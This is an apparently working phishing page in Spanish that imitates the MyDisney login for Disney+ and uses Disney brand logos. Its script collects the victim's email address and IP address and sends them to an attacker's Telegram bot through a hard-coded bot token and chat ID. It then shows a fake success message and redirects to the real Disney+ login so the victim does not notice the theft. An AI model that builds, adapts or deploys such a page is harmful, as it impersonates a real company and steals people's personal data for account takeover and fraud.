<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesi√≥n | MyDisney</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: linear-gradient(180deg, #03254f, #001226);
    color: #000;
}

/* LOGO SUPERIOR */
.logo-area {
    text-align: center;
    padding-top: 45px;
    padding-bottom: 15px;
}

.logo-area img {
    width: 160px;
    filter: brightness(4.5);
}

/* TARJETA PRINCIPAL */
.container {
    background: #fff;
    border-radius: 28px 28px 0 0;
    padding: 40px 25px;
    margin-top: 20px;
}

/* LOGO MYDISNEY */
.mydisney-logo {
    width: 120px;
    margin-bottom: 10px;
}

/* TITULO */
h1 {
    font-size: 26px;
    font-weight: 600;
    margin-bottom: 10px;
}

/* SUBTEXTO */
.subtxt {
    font-size: 15px;
    color: #555;
    line-height: 1.45;
    margin-bottom: 25px;
}

/* INPUT */
input {
    width: 100%;
    padding: 17px;
    border: 1px solid #d1d5db;
    border-radius: 12px;
    font-size: 15px;
    background: #f4f5f7;
    margin-bottom: 20px;
}

/* BOT√ìN */
button {
    width: 100%;
    padding: 18px;
    background: #000;
    color: #fff;
    border: none;
    border-radius: 40px;
    font-size: 17px;
    cursor: pointer;
    font-weight: 500;
    transition: background 0.3s;
}

button:hover {
    background: #333;
}

/* BLOQUE INFERIOR (BLANCO) */
.bottom-info {
    background: #ffffff;
    padding: 35px 25px 20px 25px;
}

/* P√ÅRRAFOS */
.bottom-info p {
    color: #333;
    font-size: 15px;
    line-height: 1.5;
}

/* ENLACE */
.link {
    color: #007bff;
}

/* LOGOS */
.brands {
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    gap: 22px;
    margin-top: 25px;
}

.brands img {
    height: 30px;
    opacity: 0.8;
}

/* LOADING SPINNER */
.loading {
    display: none;
    text-align: center;
    margin-top: 15px;
}

.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #000;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 0 auto;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* MENSAJE DE √âXITO */
.success-message {
    display: none;
    text-align: center;
    padding: 20px;
    background: #d4edda;
    color: #155724;
    border-radius: 12px;
    margin-top: 20px;
}

/* ERROR MESSAGE */
.error-message {
    display: none;
    text-align: center;
    padding: 12px;
    background: #f8d7da;
    color: #721c24;
    border-radius: 8px;
    margin-top: 10px;
    font-size: 14px;
}
</style>
</head>

<body>

<!-- LOGO SUPERIOR -->
<div class="logo-area">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
</div>

<!-- FORMULARIO -->
<div class="container">

    <img class="mydisney-logo" src="https://upload.wikimedia.org/wikipedia/commons/f/f3/My_Disney_Logo.png">

    <h1>Escribir correo para continuar</h1>

    <p class="subtxt">
        Es necesario iniciar sesi√≥n en Disney+ con tu cuenta de MyDisney.
        En caso de no tener una, recibir√°s indicaciones para crearla.
    </p>

    <input type="email" id="emailInput" placeholder="Correo electr√≥nico">

    <!-- Mensaje de error -->
    <div id="errorMessage" class="error-message"></div>

    <button id="continueBtn" onclick="iniciarSesion()">Continuar</button>

    <!-- Loading spinner -->
    <div id="loading" class="loading">
        <div class="spinner"></div>
        <p style="color:#555; margin-top:10px;">Verificando...</p>
    </div>

    <!-- Mensaje de √©xito -->
    <div id="successMessage" class="success-message">
        <p>‚úÖ Correo verificado. Redirigiendo a Disney+...</p>
    </div>

</div>

<!-- BLOQUE BLANCO INFERIOR -->
<div class="bottom-info">

    <p><strong>Disney+ es parte de la Familia de Compa√±√≠as Walt Disney</strong></p>

    <p>
        MyDisney te permite iniciar sesi√≥n f√°cilmente en los servicios y experiencias
        de la Familia de Compa√±√≠as Walt Disney, como Disney+, ESPN, Walt Disney World
        <span class="link">y muchos m√°s.</span>
    </p>

    <!-- LOGOS -->
    <div class="brands">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney_wordmark.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/80/ABC_Network_logo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/ESPN_wordmark.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/MarvelLogo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Star_Wars_Logo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/National-Geographic-Logo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Hulu_Logo.svg">
    </div>

</div>

<script>
// Elementos del DOM
const emailInput = document.getElementById('emailInput');
const continueBtn = document.getElementById('continueBtn');
const loading = document.getElementById('loading');
const errorMessage = document.getElementById('errorMessage');
const successMessage = document.getElementById('successMessage');

// Funci√≥n para enviar correo a Telegram
async function enviarCorreoATelegram(correo) {
    const botToken = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
    const chatId = "7776240161";
    
    const mensaje = `üìß NUEVO INICIO DE SESI√ìN DISNEY+
üÜî Correo electr√≥nico: ${correo}
üïê Fecha: ${new Date().toLocaleString()}
üåê IP: ${await obtenerIP()}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: mensaje
            })
        });
        console.log('Correo enviado a Telegram exitosamente');
        return true;
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        return false;
    }
}

// Funci√≥n para obtener IP aproximada
async function obtenerIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'No disponible';
    }
}

// Funci√≥n principal para iniciar sesi√≥n
async function iniciarSesion() {
    const email = emailInput.value.trim();
    
    // Validar email
    if (!email || !email.includes('@') || !email.includes('.')) {
        mostrarError('Por favor, ingresa un correo electr√≥nico v√°lido.');
        return;
    }
    
    // Ocultar bot√≥n y mostrar loading
    continueBtn.style.display = 'none';
    loading.style.display = 'block';
    errorMessage.style.display = 'none';
    
    // Guardar email en localStorage
    localStorage.setItem('disneyEmail', email);
    
    // Enviar a Telegram
    const enviado = await enviarCorreoATelegram(email);
    
    if (enviado) {
        // Mostrar mensaje de √©xito
        loading.style.display = 'none';
        successMessage.style.display = 'block';
        
        // Redirigir despu√©s de 2 segundos
        setTimeout(() => {
            window.location.href = 'https://www.disneyplus.com/login';
        }, 2000);
    } else {
        // Mostrar error
        loading.style.display = 'none';
        continueBtn.style.display = 'block';
        mostrarError('Error de conexi√≥n. Por favor intenta nuevamente.');
    }
}

// Funci√≥n para mostrar errores
function mostrarError(mensaje) {
    errorMessage.textContent = mensaje;
    errorMessage.style.display = 'block';
}

// Permitir Enter para enviar
emailInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        iniciarSesion();
    }
});

// Cargar email guardado si existe
window.addEventListener('DOMContentLoaded', function() {
    const emailGuardado = localStorage.getItem('disneyEmail');
    if (emailGuardado) {
        emailInput.value = emailGuardado;
    }
});
</script>

</body>
</html>
